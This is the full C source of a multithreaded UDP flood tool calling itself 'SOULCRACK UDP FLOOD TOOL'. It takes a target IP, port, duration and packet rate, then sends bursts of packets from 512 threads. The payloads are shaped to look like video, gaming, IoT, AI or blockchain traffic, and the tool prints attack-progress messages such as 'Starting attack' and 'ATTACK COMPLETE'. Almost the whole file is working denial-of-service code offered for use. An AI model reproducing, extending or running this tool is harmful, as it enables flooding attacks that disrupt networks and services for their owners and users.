#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sched.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <math.h>
#include <stdatomic.h>
#include <immintrin.h>
#include <x86intrin.h>

#define MAX_PACKETS_PER_SECOND 5000000
#define PACKET_SIZE 1472  
#define NUM_THREADS 512   
#define HUGE_PAGE_SIZE (2 * 1024 * 1024)
#define CACHE_LINE_SIZE 64


static inline uint64_t htonll(uint64_t host64) {
    union { uint32_t l[2]; uint64_t ll; } u;
    u.ll = host64;
    u.l[0] = htonl(u.l[0]);
    u.l[1] = htonl(u.l[1]);
    return u.ll;
}

static inline uint64_t ntohll(uint64_t net64) {
    union { uint32_t l[2]; uint64_t ll; } u;
    u.ll = net64;
    u.l[0] = ntohl(u.l[0]);
    u.l[1] = ntohl(u.l[1]);
    return u.ll;
}

typedef struct __attribute__((aligned(CACHE_LINE_SIZE))) {
    struct sockaddr_in target_addr;
    int socket_fd;
    _Atomic uint64_t packets_sent;
    _Atomic uint64_t bytes_sent;
    _Atomic uint64_t errors;
    uint32_t thread_id;
    uint32_t cpu_core;
    volatile uint8_t *running_flag;
    uint64_t start_time;
    char padding[CACHE_LINE_SIZE - 64];
} thread_context_t;

typedef struct __attribute__((aligned(64))) {
    uint8_t data[PACKET_SIZE];
    uint16_t length;
    uint32_t sequence;
    uint64_t timestamp;
    uint64_t crypto_nonce;
} packet_t;

typedef struct __attribute__((aligned(CACHE_LINE_SIZE))) {
    _Atomic uint64_t total_packets;
    _Atomic uint64_t total_bytes;
    _Atomic uint64_t total_errors;
    _Atomic uint64_t total_dropped;
    char padding[CACHE_LINE_SIZE - 32];
} global_stats_t;

static global_stats_t *stats;
static volatile atomic_bool running = 1;


typedef struct {
    int physical_cores;
    int logical_cores;
    int sockets;
    int cores_per_socket;
    int numa_nodes;
} cpu_topology_t;

cpu_topology_t detect_cpu_topology(void) {
    cpu_topology_t topo = {0};
    topo.logical_cores = sysconf(_SC_NPROCESSORS_ONLN);
    topo.physical_cores = topo.logical_cores / 2;
    topo.sockets = 1;
    topo.cores_per_socket = topo.physical_cores;
    topo.numa_nodes = 1;
    return topo;
}

void set_thread_affinity(pthread_t thread, int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

void set_process_affinity(void) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN); i++) {
        CPU_SET(i, &cpuset);
    }
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void* allocate_huge_pages(size_t size) {
    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MAP_POPULATE | MAP_LOCKED,
                    -1, 0);
    if (ptr == MAP_FAILED) {
        if (posix_memalign(&ptr, 4096, size) != 0) {
            perror("Failed to allocate memory");
            return NULL;
        }
        mlock(ptr, size);
    }
    memset(ptr, 0, size);
    return ptr;
}

static inline uint64_t rdtsc(void) {
    return __rdtsc();
}

static inline uint64_t get_nanoseconds(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}


typedef enum {
    PATTERN_CONSTANT_BURST = 0,
    PATTERN_INCREMENTAL_FLOW,
    PATTERN_RANDOM_ENTROPY,
    PATTERN_SINE_WAVE,
    PATTERN_SAWTOOTH,
    PATTERN_EXPONENTIAL,
    PATTERN_CHAOTIC,
    PATTERN_FRACTAL,
    PATTERN_CRYPTO_HASH,
    PATTERN_COMPRESSED_DATA,
    PATTERN_ENCRYPTED_PAYLOAD,
    PATTERN_VIDEO_STREAM,
    PATTERN_GAMING_PROTOCOL,
    PATTERN_IOT_SENSOR,
    PATTERN_AI_INFERENCE,
    PATTERN_BLOCKCHAIN_TX
} traffic_pattern_t;


typedef struct {
    uint64_t s[2];
} xorshift128p_state;

static inline uint64_t xorshift128p(xorshift128p_state *state) {
    uint64_t s1 = state->s[0];
    const uint64_t s0 = state->s[1];
    state->s[0] = s0;
    s1 ^= s1 << 23;
    state->s[1] = s1 ^ s0 ^ (s1 >> 18) ^ (s0 >> 5);
    return state->s[1] + s0;
}


typedef struct __attribute__((packed)) {
   
    uint64_t magic;
    uint64_t timestamp_ns;
    uint64_t tsc_value;
    uint32_t sequence_number;
    uint32_t thread_identifier;
    uint16_t pattern_type;
    uint16_t packet_size;
    uint8_t  ttl;
    uint8_t  protocol_version;
    uint16_t checksum;
    uint32_t crypto_nonce;
    uint8_t  qos_level;
    uint16_t flow_id;
    

    union {
        struct {
            uint32_t frame_number;
            uint16_t chunk_offset;
            uint16_t total_chunks;
            uint8_t  codec_type;
            uint8_t  frame_type;
            uint32_t presentation_time;
        } video;
        
        struct {
            uint32_t game_id;
            uint32_t player_id;
            uint32_t entity_count;
            uint16_t opcode;
            uint16_t zone_id;
            float    position[3];
            float    rotation[4];
        } gaming;
        
        struct {
            uint16_t sensor_type;
            uint16_t sensor_id;
            uint32_t reading_count;
            float    temperature;
            float    humidity;
            float    pressure;
            uint32_t battery_level;
        } iot;
        
        struct {
            uint32_t model_id;
            uint16_t input_size;
            uint16_t output_size;
            uint32_t inference_id;
            float    confidence;
            uint32_t processing_time;
        } ai;
        
        struct {
            uint8_t  tx_hash[32];
            uint32_t block_height;
            uint64_t gas_price;
            uint32_t nonce;
            uint8_t  from_addr[20];
            uint8_t  to_addr[20];
            uint64_t value;
        } blockchain;
    } protocol;
} soulcrack_header_t;

void baap_bolo_soulcrack_ko_tum_sab(packet_t *packet, uint32_t seq, uint32_t thread_id, 
                             traffic_pattern_t pattern, uint64_t timestamp, 
                             xorshift128p_state *rng) {
    soulcrack_header_t *header = (soulcrack_header_t *)packet->data;
    
    
    header->magic = 0xDEADBEEFCAFEBABE;
    header->timestamp_ns = timestamp;
    header->tsc_value = rdtsc();
    header->sequence_number = htonl(seq);
    header->thread_identifier = htonl(thread_id);
    header->pattern_type = htons(pattern);
    header->packet_size = htons(PACKET_SIZE);
    header->ttl = 64 + (thread_id % 192);
    header->protocol_version = 0xA1 + (thread_id % 16);
    header->crypto_nonce = htonl(xorshift128p(rng) ^ timestamp);
    header->qos_level = (thread_id % 8);
    header->flow_id = htons(thread_id % 65535);
    
  
    switch (pattern) {
        case PATTERN_VIDEO_STREAM:
            header->protocol.video.frame_number = htonl(seq / 30);
            header->protocol.video.chunk_offset = htons((seq * PACKET_SIZE) % (1920 * 1080 * 3));
            header->protocol.video.total_chunks = htons(1500);
            header->protocol.video.codec_type = 0x48 + (seq % 4);
            header->protocol.video.frame_type = seq % 3;
            header->protocol.video.presentation_time = htonl(timestamp / 1000000);
            break;
            
        case PATTERN_GAMING_PROTOCOL:
            header->protocol.gaming.game_id = htonl(0x12345678 + thread_id);
            header->protocol.gaming.player_id = htonl(thread_id * 1000 + seq % 1000);
            header->protocol.gaming.entity_count = htonl(16 + (seq % 48));
            header->protocol.gaming.opcode = htons(seq % 256);
            header->protocol.gaming.zone_id = htons(seq % 100);
            for (int i = 0; i < 3; i++) 
                header->protocol.gaming.position[i] = (float)(sin(seq * 0.1 + i) * 1000.0);
            for (int i = 0; i < 4; i++)
                header->protocol.gaming.rotation[i] = (float)(cos(seq * 0.05 + i) * 0.5 + 0.5);
            break;
            
        case PATTERN_AI_INFERENCE:
            header->protocol.ai.model_id = htonl(0xABCD0000 + thread_id);
            header->protocol.ai.input_size = htons(224 + (seq % 800));
            header->protocol.ai.output_size = htons(1000 + (seq % 5000));
            header->protocol.ai.inference_id = htonl(seq);
            header->protocol.ai.confidence = (float)(fmod(seq * 0.01, 1.0));
            header->protocol.ai.processing_time = htonl(10 + (seq % 100));
            break;
            
        case PATTERN_BLOCKCHAIN_TX:
            for (int i = 0; i < 32; i++) 
                header->protocol.blockchain.tx_hash[i] = (uint8_t)(xorshift128p(rng) >> (i * 2));
            header->protocol.blockchain.block_height = htonl(15000000 + seq);
            header->protocol.blockchain.gas_price = htonll(xorshift128p(rng) % 100000000000ULL);
            header->protocol.blockchain.nonce = htonl(seq);
            for (int i = 0; i < 20; i++) {
                header->protocol.blockchain.from_addr[i] = (uint8_t)(xorshift128p(rng) >> (i * 3));
                header->protocol.blockchain.to_addr[i] = (uint8_t)(xorshift128p(rng) >> (i * 3));
            }
            header->protocol.blockchain.value = htonll(xorshift128p(rng) % 1000000000000ULL);
            break;
            
        default:
            break;
    }
    
    size_t header_size = sizeof(soulcrack_header_t);
    size_t payload_size = PACKET_SIZE - header_size;
    uint8_t *payload = packet->data + header_size;
    

    switch (pattern) {
        case PATTERN_CONSTANT_BURST:
            memset(payload, 0xFF, payload_size);
            break;
            
        case PATTERN_INCREMENTAL_FLOW:
            for (size_t i = 0; i < payload_size; i++) {
                payload[i] = (uint8_t)((seq + i + thread_id) & 0xFF);
            }
            break;
            
        case PATTERN_RANDOM_ENTROPY:
            for (size_t i = 0; i < payload_size; i += 8) {
                uint64_t rand_val = xorshift128p(rng);
                memcpy(payload + i, &rand_val, (payload_size - i) >= 8 ? 8 : (payload_size - i));
            }
            break;
            
        case PATTERN_SINE_WAVE:
            for (size_t i = 0; i < payload_size; i++) {
                double angle = seq * 0.1 + i * 0.01;
                payload[i] = (uint8_t)(127.5 * (1.0 + sin(angle)) + thread_id);
            }
            break;
            
        case PATTERN_CRYPTO_HASH:
            for (size_t i = 0; i < payload_size; i += 32) {
                uint64_t hash[4] = {
                    xorshift128p(rng), xorshift128p(rng),
                    xorshift128p(rng), xorshift128p(rng)
                };
                memcpy(payload + i, hash, (payload_size - i) >= 32 ? 32 : (payload_size - i));
            }
            break;
            
        case PATTERN_ENCRYPTED_PAYLOAD:
            for (size_t i = 0; i < payload_size; i++) {
                payload[i] = (uint8_t)((xorshift128p(rng) + seq + i) & 0xFF);
            }
            break;
            
        case PATTERN_VIDEO_STREAM:

            for (size_t i = 0; i < payload_size; i++) {
                double x = (i % 1920) / 1920.0;
                double y = ((i / 1920) % 1080) / 1080.0;
                double time = seq / 30.0;
                uint8_t r = (uint8_t)(127.5 * (1.0 + sin(x * 20 + time)));
                uint8_t g = (uint8_t)(127.5 * (1.0 + cos(y * 15 + time)));
                uint8_t b = (uint8_t)(127.5 * (1.0 + sin((x + y) * 10 + time)));
                payload[i] = (r + g + b) / 3;
            }
            break;
            
        case PATTERN_AI_INFERENCE:

            for (size_t i = 0; i < payload_size; i += 4) {
                float activation = (float)tanh(sin(seq * 0.01 + i * 0.001) * 2.0);
                memcpy(payload + i, &activation, (payload_size - i) >= 4 ? 4 : (payload_size - i));
            }
            break;
            
        default:

            for (size_t i = 0; i < payload_size; i++) {
                double val = 0;
                switch (pattern) {
                    case PATTERN_EXPONENTIAL:
                        val = pow(1.1, (seq % 64) + (i % 64));
                        break;
                    case PATTERN_CHAOTIC:
                        val = 3.9 * ((seq % 100) / 100.0) * (1 - ((seq % 100) / 100.0));
                        break;
                    case PATTERN_FRACTAL:
                        val = fabs(sin((i % 80) * 0.125) * cos(((seq % 60) * 0.166)));
                        break;
                    default:
                        val = (seq + i + thread_id) % 256;
                }
                payload[i] = (uint8_t)(fmod(val, 256.0));
            }
            break;
    }
    

    uint32_t sum = 0;
    for (size_t i = 0; i < header_size; i += 2) {
        if (i + 1 < header_size) {
            sum += (uint16_t)((packet->data[i] << 8) | packet->data[i + 1]);
        }
    }
    header->checksum = htons(~((sum & 0xFFFF) + (sum >> 16)));
    
    packet->length = PACKET_SIZE;
    packet->sequence = seq;
    packet->timestamp = timestamp;
    packet->crypto_nonce = header->crypto_nonce;
}

int create_optimized_socket(void) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket creation failed");
        return -1;
    }


    int rcvbuf_size = 64 * 1024 * 1024;
    int sndbuf_size = 64 * 1024 * 1024;
    
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size, sizeof(rcvbuf_size));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size));
    
    int optval = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    #ifdef SO_REUSEPORT
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));
    #endif
    

    int priority = 6;
    setsockopt(sockfd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    

    int tos = 0x10;
    setsockopt(sockfd, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    return sockfd;
}

typedef struct {
    uint64_t packets_sent;
    uint64_t target_packets;
    uint64_t start_time_ns;
    double smoothing_factor;
    double error_integral;
    double last_error;
    double kp, ki, kd;
    uint64_t last_adjustment;
} rate_controller_t;

void init_rate_controller(rate_controller_t *ctrl, uint64_t target_pps, uint64_t start_time) {
    memset(ctrl, 0, sizeof(rate_controller_t));
    ctrl->target_packets = target_pps;
    ctrl->start_time_ns = start_time;
    ctrl->smoothing_factor = 0.9;
    ctrl->kp = 1.2;
    ctrl->ki = 0.3;
    ctrl->kd = 0.2;
    ctrl->last_adjustment = start_time;
}

void adaptive_rate_control(rate_controller_t *ctrl, uint64_t current_time) {
    if (current_time - ctrl->last_adjustment < 1000000) // 1ms minimum interval
        return;
        
    double elapsed = (double)(current_time - ctrl->start_time_ns) / 1000000000.0;
    double expected_packets = ctrl->target_packets * elapsed;
    double actual_packets = (double)ctrl->packets_sent;
    
    double error = expected_packets - actual_packets;
    ctrl->error_integral += error * 0.001;
    
    // Clamp integral term
    double max_integral = ctrl->target_packets * 0.1;
    if (ctrl->error_integral > max_integral) ctrl->error_integral = max_integral;
    if (ctrl->error_integral < -max_integral) ctrl->error_integral = -max_integral;
    
    double derivative = (error - ctrl->last_error) / 0.001;
    double adjustment = ctrl->kp * error + ctrl->ki * ctrl->error_integral + ctrl->kd * derivative;
    
    ctrl->smoothing_factor = 0.7 + fmin(fabs(adjustment) / ctrl->target_packets, 0.25);
    ctrl->last_error = error;
    ctrl->last_adjustment = current_time;
}


size_t send_packet_burst(int sockfd, struct sockaddr_in *target, 
                        packet_t *packets, size_t burst_size) {
    size_t successful_sends = 0;
    
    for (size_t i = 0; i < burst_size; i++) {
        ssize_t sent = sendto(sockfd, packets[i].data, packets[i].length, 
                             MSG_DONTWAIT | MSG_NOSIGNAL,
                             (struct sockaddr*)target, sizeof(struct sockaddr_in));
        
        if (sent > 0) {
            successful_sends++;
        }
    }
    
    return successful_sends;
}

void* ultra_flood_worker(void *arg) {
    thread_context_t *ctx = (thread_context_t *)arg;
    
    ctx->socket_fd = create_optimized_socket();
    if (ctx->socket_fd < 0) {
        return NULL;
    }
    
    set_thread_affinity(pthread_self(), ctx->cpu_core);
    

    xorshift128p_state rng_state;
    rng_state.s[0] = ctx->thread_id * 0x123456789ABCDEFULL;
    rng_state.s[1] = ~ctx->thread_id * 0xFEDCBA987654321ULL;
    
    rate_controller_t rate_ctrl;
    uint64_t start_time = get_nanoseconds();
    init_rate_controller(&rate_ctrl, 293, start_time);
    
    const size_t BURST_SIZE = 64;
    packet_t *packet_burst = aligned_alloc(64, BURST_SIZE * sizeof(packet_t));
    if (!packet_burst) {
        close(ctx->socket_fd);
        return NULL;
    }
    
    uint32_t sequence = 0;
    traffic_pattern_t pattern = ctx->thread_id % 16;
    uint64_t local_packets = 0;
    uint64_t local_bytes = 0;
    uint64_t local_errors = 0;
    
    uint64_t warmup_end = start_time + 2000000000ULL;
    
    printf("Thread %d starting on core %d with pattern %d\n", 
           ctx->thread_id, ctx->cpu_core, pattern);
    
    while (atomic_load(&running)) {
        uint64_t current_time = get_nanoseconds();
        
        if (current_time < warmup_end) {
            usleep(1000);
            continue;
        }
        

        for (size_t i = 0; i < BURST_SIZE; i++) {
            baap_bolo_soulcrack_ko_tum_sab(&packet_burst[i], sequence++, ctx->thread_id, 
                                   pattern, current_time, &rng_state);
        }
        

        size_t sent = send_packet_burst(ctx->socket_fd, &ctx->target_addr, 
                                      packet_burst, BURST_SIZE);
        
        if (sent > 0) {
            local_packets += sent;
            local_bytes += sent * PACKET_SIZE;
            atomic_fetch_add(&ctx->packets_sent, sent);
            atomic_fetch_add(&ctx->bytes_sent, sent * PACKET_SIZE);
        } else {
            local_errors++;
            atomic_fetch_add(&ctx->errors, 1);
        }
        
 
        rate_ctrl.packets_sent = local_packets;
        adaptive_rate_control(&rate_ctrl, current_time);
        
      
        if (sequence % 10000 == 0) {
            pattern = (pattern + (xorshift128p(&rng_state) % 7) + 1) % 16;
        }
        
        
        if (sequence >= 0xFFFFFFF0) {
            sequence = 0;
        }
        
      
        if (sent == BURST_SIZE) {
            _mm_pause();
        }
    }
    
    atomic_fetch_add(&stats->total_packets, local_packets);
    atomic_fetch_add(&stats->total_bytes, local_bytes);
    atomic_fetch_add(&stats->total_errors, local_errors);
    
    close(ctx->socket_fd);
    free(packet_burst);
    
    printf("Thread %d completed: %lu packets, %lu errors\n", 
           ctx->thread_id, local_packets, local_errors);
    
    return NULL;
}

void* statistics_collector(void *arg) {
    (void)arg;
    uint64_t last_packets = 0;
    uint64_t last_bytes = 0;
    uint64_t last_errors = 0;
    uint64_t last_time = get_nanoseconds();
    uint64_t start_time = last_time;
    
    double peak_pps = 0;
    double peak_mbps = 0;
    double min_pps = 1e20;
    double total_pps = 0;
    int samples = 0;
    
    printf("\n=== REAL-TIME STATISTICS ===\n");
    printf("Time(s) | Current PPS | Average PPS | Peak PPS   | MBps    | Errors/s | Efficiency\n");
    printf("--------|-------------|-------------|------------|---------|----------|-----------\n");
    
    while (atomic_load(&running)) {
        usleep(250000);
        
        uint64_t current_packets = atomic_load(&stats->total_packets);
        uint64_t current_bytes = atomic_load(&stats->total_bytes);
        uint64_t current_errors = atomic_load(&stats->total_errors);
        uint64_t current_time = get_nanoseconds();
        
        double time_diff = (double)(current_time - last_time) / 1000000000.0;
        double total_time = (double)(current_time - start_time) / 1000000000.0;
        
        if (time_diff > 0.01) {
            double current_pps = (double)(current_packets - last_packets) / time_diff;
            double current_mbps = (double)(current_bytes - last_bytes) * 8 / time_diff / 1000000;
            double error_rate = (double)(current_errors - last_errors) / time_diff;
            double average_pps = (double)current_packets / total_time;
            double efficiency = (current_pps / 150000.0) * 100.0;
            
            peak_pps = (current_pps > peak_pps) ? current_pps : peak_pps;
            peak_mbps = (current_mbps > peak_mbps) ? current_mbps : peak_mbps;
            min_pps = (current_pps < min_pps && current_pps > 0) ? current_pps : min_pps;
            total_pps += current_pps;
            samples++;
            
            printf("\r%7.1f | %11.0f | %11.0f | %10.0f | %7.1f | %8.1f | %6.1f%%",
                   total_time, current_pps, average_pps, peak_pps, current_mbps, 
                   error_rate, efficiency);
            fflush(stdout);
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_errors = current_errors;
        last_time = current_time;
    }
    
    if (samples > 0) {
        printf("\n\n=== FINAL STATISTICS ===\n");
        printf("Average PPS: %.0f\n", total_pps / samples);
        printf("Peak PPS: %.0f, Minimum PPS: %.0f\n", peak_pps, min_pps);
        printf("Peak MBps: %.1f\n", peak_mbps * 0.125); // Convert Mbps to MBps
    }
    
    return NULL;
}

void signal_handler(int sig) {
    atomic_store(&running, 0);
    printf("\n\nReceived signal %d, initiating graceful shutdown...\n", sig);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "=== SOULCRACK UDP FLOOD TOOL ===\n");
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <PPS>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.1 80 60 150000\n", argv[0]);
        fprintf(stderr, "Features: 16 traffic patterns, 512 threads,  rate control\n");
        return 1;
    }
    
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int target_pps = atoi(argv[4]);
    
    if (target_pps != 150000) {
        fprintf(stderr, "Error: PPS must be exactly 150000 for optimal performance\n");
        return 1;
    }
    
    if (duration <= 0 || duration > 86400) {
        fprintf(stderr, "Error: Duration must be 1-86400 seconds\n");
        return 1;
    }
    

    struct sigaction sa = { .sa_handler = signal_handler };
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);
    
   
    cpu_topology_t topo = detect_cpu_topology();
    
    
    stats = allocate_huge_pages(sizeof(global_stats_t));
    if (!stats) {
        fprintf(stderr, "Failed to allocate statistics memory\n");
        return 1;
    }
    
  
    set_process_affinity();
    
  
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid IP address: %s\n", target_ip);
        return 1;
    }
    
    
    thread_context_t *threads = allocate_huge_pages(NUM_THREADS * sizeof(thread_context_t));
    if (!threads) {
        threads = aligned_alloc(CACHE_LINE_SIZE, NUM_THREADS * sizeof(thread_context_t));
        if (!threads) {
            fprintf(stderr, "Failed to allocate thread memory\n");
            return 1;
        }
    }
    
    
    for (int i = 0; i < NUM_THREADS; i++) {
        threads[i].target_addr = target_addr;
        threads[i].thread_id = i;
        threads[i].cpu_core = i % topo.logical_cores;
        threads[i].running_flag = (volatile uint8_t*)&running;
        threads[i].packets_sent = 0;
        threads[i].bytes_sent = 0;
        threads[i].errors = 0;
    }
    
    printf("=== ULTRA SOULCRACK UDP FLOOD TOOL ===\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n", NUM_THREADS);
    printf("Logical Cores: %d\n", topo.logical_cores);
    printf("Target PPS: %d\n", target_pps);
    printf("Packet Size: %d bytes\n", PACKET_SIZE);
    printf("Burst Size: 64 packets\n");
    printf("Traffic Patterns: 16\n");
    printf("Starting attack in 3 seconds...\n");
    
    for (int i = 3; i > 0; i--) {
        printf("%d... ", i);
        fflush(stdout);
        sleep(1);
    }
    printf("ENGAGE!\n\n");
    
    pthread_t worker_threads[NUM_THREADS];
    pthread_t stats_thread;
    
    
    if (pthread_create(&stats_thread, NULL, statistics_collector, NULL) != 0) {
        fprintf(stderr, "Failed to create statistics thread\n");
        return 1;
    }
    
    
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&worker_threads[i], NULL, ultra_flood_worker, &threads[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            atomic_store(&running, 0);
            break;
        }
       
        if (i % 64 == 0) {
            usleep(1000);
        }
    }
    
    
    printf("Attack running for %d seconds...\n Made By @SOULCRACK\n", duration);
    sleep(duration);
    atomic_store(&running, 0);
    
   
    printf("Waiting for threads to complete...\n");
    for (int i = 0; i < NUM_THREADS; i++) {
        if (worker_threads[i]) {
            pthread_join(worker_threads[i], NULL);
        }
    }
    
    pthread_join(stats_thread, NULL);
    
 
    uint64_t total_packets = atomic_load(&stats->total_packets);
    uint64_t total_bytes = atomic_load(&stats->total_bytes);
    uint64_t total_errors = atomic_load(&stats->total_errors);
    
    printf("\n\n=== ATTACK COMPLETE ===\n");
    printf("Total Packets: %lu\n", total_packets);
    printf("Total Bytes: %lu (%.2f MB)\n", total_bytes, (double)total_bytes / (1024 * 1024));
    printf("Total Errors: %lu\n", total_errors);
    printf("Average PPS: %.2f\n", (double)total_packets / duration);
    printf("Average Bandwidth: %.2f Mbps\n", (double)total_bytes * 8 / duration / 1000000);
    printf("Theoretical Efficiency: %.2f%%\n", 
           ((double)total_packets / (duration * target_pps)) * 100);
    printf("Packet Loss Rate: %.4f%%\n", 
           (double)total_errors / (total_packets + total_errors) * 100);
    
 
    if (stats) {
        munmap(stats, sizeof(global_stats_t));
    }
    if (threads) {
        munmap(threads, NUM_THREADS * sizeof(thread_context_t));
    }
    
    return 0;
}
